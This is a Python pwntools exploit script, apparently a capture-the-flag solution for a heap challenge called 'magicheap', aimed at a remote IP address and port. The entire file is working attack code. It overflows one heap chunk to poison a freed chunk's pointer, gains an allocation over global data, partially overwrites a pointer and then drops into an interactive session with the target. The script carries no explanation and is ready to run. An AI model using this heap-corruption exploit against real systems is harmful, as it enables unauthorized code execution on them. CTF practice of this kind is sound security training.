#!/usr/bin/env python3
from pwn import *
import time

DELAY = 0.1

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

r = remote("35.201.132.60", 50216)
#r = process('./magicheap')#, env = {"LD_PRELOAD": "./libc.so.6"})
#gdb.attach(proc.pidof(r)[0])

def allocate(size, data):
    print("allocate", size, data)
    r.sendlineafter(':', "1")
    time.sleep(DELAY)
    r.sendlineafter(':', str(size))
    time.sleep(DELAY)
    r.sendafter(':', data)
    time.sleep(DELAY)

def edit(index, size, data):
    print("edit", index, size, data)
    r.sendlineafter(':', "2")
    time.sleep(DELAY)
    r.sendlineafter(':', str(index))
    time.sleep(DELAY)
    r.sendlineafter(':', str(size))
    time.sleep(DELAY)
    r.sendafter(':', data)
    time.sleep(DELAY)

def free(index):
    print("free", index)
    r.sendlineafter(':', "3")
    time.sleep(DELAY)
    r.sendlineafter(':', str(index))
    time.sleep(DELAY)

r.sendafter("Name:", flat([0, 0x20]))
time.sleep(DELAY)

allocate(0x10, "AAAA")
allocate(0x10, "AAAA")
allocate(0x10, "AAAA")

free(1)

edit(0, 0x28, b'A' * 0x10 + flat([0, 0x21, 0x6020a0]))

allocate(0x10, 'BBBB')
allocate(0x10, flat([0x602040, 0x6020b0]))

edit(0, 0x2, '\x17\x11')

r.interactive()
